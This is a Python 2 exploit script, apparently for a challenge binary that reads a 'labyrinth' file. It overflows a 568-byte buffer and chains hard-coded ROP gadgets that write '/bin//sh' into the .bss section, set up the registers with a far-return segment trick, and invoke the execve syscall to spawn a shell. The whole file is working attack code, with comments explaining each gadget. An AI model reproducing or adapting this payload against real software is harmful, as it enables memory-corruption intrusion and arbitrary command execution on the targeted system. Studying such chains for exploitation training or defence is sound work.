#!/usr/bin/python

from struct import pack
from os import system

junk = 'A'*568 #junk to offset to stored ret

bssaddr = 0x080952c0 #start of the .bss address where we write our code to run

#set of useful rop gadgets that I used to write the exploit

pop_eax = 0x080519bd # pop eax pop ebp ret
pop_ebx = 0x0804a389 # pop ebx ret
pop_ecx = 0x0807f864 # pop ecx retf (retf is important)
pop_edx = 0x08061970 # pop edx and al pop ebp ret
movpop  = 0x0804de99 # mov dword ptr [eax], edx ; nop ; pop ebp ; ret

p = junk

p += pack("<L", pop_edx) #writing the first part of the string, the string is duplicated
p += "/bin"              #because of the ebp pop that this gadget has
p += "/bin"

p += pack("<L", pop_eax) #address to write the string
p += pack("<L", bssaddr)
p += pack("<L", bssaddr)

p += pack("<L", movpop) #writing the string
p += pack("<L", bssaddr)

p += pack("<L", pop_edx) #second part of the string
p += "//sh"
p += "//sh"

p += pack("<L", pop_eax)
p += pack("<L", bssaddr + 4)
p += pack("<L", bssaddr + 4)

p += pack("<L", movpop)
p += pack("<L", bssaddr)

#using the same function to write in memory the address of the string, this is needed to call
#the syscall later

p += pack("<L", pop_edx)
p += pack("<L", bssaddr)
p += pack("<L", bssaddr)

p += pack("<L", pop_eax)
p += pack("<L", bssaddr + 12)
p += pack("<L", bssaddr + 12)

p += pack("<L", movpop)
p += pack("<L", bssaddr)

p += pack("<L",pop_ebx)
p += pack("<L",bssaddr)      # location of string /bin/sh

#clear edx before calling syscall
p += pack("<L", pop_edx)
p += pack("<L", 0x00000000)
p += pack("<L", 0x00000000)

p += pack("<L",pop_ecx)
p += pack("<L",bssaddr + 12) # address of pointer to /bin/sh

p += pack("<L",pop_eax)
p += pack("<L",0x00000023) #this is needed because retf pops twice from the stack, so you need to provide
						   #this value to the code segment register

p += pack("<I", 0x0000000B) #11, code from execv
p += pack("<I", 0x0000000B)

p += pack("<L",0x0804c480) #exec syscall

print p #prints the finalized payload to create the labyrinth file